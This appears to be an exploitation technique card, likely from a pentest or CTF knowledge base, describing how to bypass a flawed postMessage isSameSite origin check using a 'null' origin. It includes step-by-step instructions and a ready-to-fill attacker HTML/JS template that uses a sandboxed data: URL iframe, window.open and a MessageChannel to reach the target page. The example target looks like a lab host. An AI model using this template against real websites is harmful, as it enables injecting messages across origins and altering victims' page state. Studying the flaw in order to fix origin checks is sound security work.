---
name: isamesite_null_origin_bypass
vuln_type: csrf
sub_technique: samesite_bypass
category: exploitation
safety_level: safe
---

# Postmessage Issamesite Check Bypass Via Null Origin

## When to Apply

Client-side JS checks isSameSite(window.origin, e.origin) on postMessage receipt, and the isSameSite implementation uses origin.slice(7).split('.').slice(-2).join('.').endsWith(...). When e.origin='null' from data: URL, sandbox iframe, or blob: URL, 'null'.slice(7)='' → endsWith('')=true, always passing.

## Prerequisites

- Target page performs origin check in postMessage event listener
- isSameSite uses slice(7) + endsWith pattern
- Attacker can send postMessage from data: URL or sandboxed iframe

## Steps

1. Analyze target page's message event listener — check isSameSite logic
2. `origin.slice(7)` → intended to strip 'http://', but returns empty string for 'null'
3. `''.split('.').slice(-2).join('.')` = `''`
4. `anything.endsWith('')` = `true` — always passes
5. Load data: URL in sandbox iframe + allow-same-origin on attacker page
6. Inside data: URL, open target with window.open and send postMessage to iframe
7. Establish bidirectional communication via MessageChannel port transfer

## Code Template

```
<!-- Attacker page -->
<iframe sandbox='allow-scripts allow-same-origin allow-popups'
  id='exploit'></iframe>
<script>
exploit.src = `data:text/html,<script>
  var w = window.open('{target_url}');
  setTimeout(() => {
    var mc = new MessageChannel();
    mc.port1.onmessage = (e) => { /* handle response */ };
    w[0].postMessage(1, '*', [mc.port2]);
  }, 1000);
<\/script>`;
</script>
```

## Examples

### Example 1

- **target_url**: http://frontend:8080/
- **attacker_origin**: null (data: URL in sandbox iframe)
- **bypass_reason**: 'null'.slice(7)='' → endsWith('')=true

allow-same-origin required on sandbox iframe. After bidirectional communication via MessageChannel, window properties can be set (debug mode, etc.).
